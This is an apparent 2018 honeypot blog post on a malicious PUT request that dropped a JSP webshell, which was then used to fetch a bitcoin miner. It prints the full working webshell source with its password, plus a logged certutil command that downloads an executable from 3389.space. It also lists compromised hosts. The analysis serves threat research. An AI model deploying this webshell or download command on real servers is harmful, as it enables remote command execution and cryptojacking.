---
title: "Just Try to PUT a Bitcoin Miner"
#author: "Author Name"
description: "Summary of research into malicious PUT request dropping a indexweb4.jsp JSP foothold tool, followed by GET requests using the tool to drop a bitcoin miner."
#cover: "/img/cover.jpg"
#tags: ["tagA", "tagB"]
date: 2018-11-18T00:00:00-00:00
draft: false
---

Glastopf, the web server honeypot, received a couple generic probe attempts from 27.210.190.226, then immediately received a PUT request for "/indexweb4.jsp/" ([VirusTotal report](https://www.virustotal.com/#/file/4069fc08a2e40321b778b0627a1f9bc6e0d36922882c6aa97111acd93663a42e)).

```jsp
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
<%!public static String excuteCmd(String c) 
{
    StringBuilder line = new StringBuilder();
try 
{
    Process pro = Runtime.getRuntime().exec(c);
    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
    String temp = null;
    while ((temp = buf.readLine()) != null) 
    {
        line.append(temp+"\\n");
    }
    buf.close();
} 
catch (Exception e) 
{
    line.append(e.getMessage());
}
return line.toString();
}
%>
<%
if("bala123".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd")))
{
    out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");
}
else
{
    out.println(":-)");
}
%>
```

Shortly afterwards, Glastopf registered a request to that JSP file:

```
/indexweb4.jsp?cmd=cmd.exe%20/c%20certutil.exe%20-urlcache%20-split%20-f%20hxxp://3389.space/nw/vm.exe%20c:/windows/inf/sst.exe&pwd=bala123
```

This would [abuse certutil.exe](https://isc.sans.edu/forums/diary/A+Suspicious+Use+of+certutilexe/23517/) to download an arbitrary file, in this case [vm.exe](https://www.virustotal.com/#/file/aae9e8d1ad38d6b0a5b1641004854cf20e4ff425b2aa5a182f8f66f27b746e95) from 3389.space.  Certutil is a Windows utility designed to help manage certificates, but it's great at downloading files in a proxy-aware way.  Virus Total reports that vm.exe is a bitcoin miner.

Back in May, [@sec\_chick reported](https://twitter.com/one_chick_sec/status/1001494150720581632) this behavior.  At that time, @sec\_chick reports that it was downloading a different EXE, [another bitcoin minter](https://www.virustotal.com/#/file/ed987ec9122a76f7eae969197717b59774836d32e91bb27902e4f665c9c91aea).

Sites that seem to have been infected (search `776 indexweb4.jsp`):

* hxxp://www.tongshengdianli.com/
* hxxp://74.208.15.120/
* hxxp://221.10.166.177/
* hxxp://114.255.185.211/

74.208.15.120 is in rough shape.  Someone who has used this same tool to exploit it has dropped a [webshell](hxxps://github.com/xl7dev/WebShell/blob/master/Aspx/hec.aspx) in there in the top directory, along with a couple of pieces of malware titled [pr.exe](https://www.virustotal.com/#/file/e8d2a3eefb3739a59b0ea040badb413ac00b2392b7814b520e3fcc12a42cecab/detection) and [cmd.exe](https://www.virustotal.com/#/file/52050870ab2816934503d5982239f1fa7fa3e106a906f4c375837b496d50b32c/detection).

Similarly, 221.10.166.177 has a ton of material dumped there by someone experimenting.  Notably `qdww5004.txt`, which looks to be a webshell or similar, related to `cnhonkerarmy`.  114.255.185.211 has become someone's repository of terrible executables, Chrome warns about it upon visiting.  

Google finds other sites that seem to be affected, or previously affected.  A surprising number redirect to hxxps://www.cjb.net/ now...

3389.space is a domain associated with other malicious campaigns:

* [New Jenkins Campaign Hides Malware, Kills Competing Crypto-Miners](https://www.f5.com/labs/articles/threat-intelligence/new-jenkins-campaign-hides-malware--kills-competing-crypto-miner")
* [Talos report related to 3389.space, similar to the above, but slightly broader](https://blog.talosintelligence.com/2018/08/rocke-champion-of-monero-miners.html)
* [A report on ss.exe, served from the domain](https://www.joesandbox.com/analysis/58636/0/executive)

Other reports of similar "indexweb4.jsp" abuse:

* https://www.abuseipdb.com/check/112.226.252.84
* https://k-anz.hatenablog.com/entry/2018/07/15/102648 - someone who ended up writing a very similar article, back in September
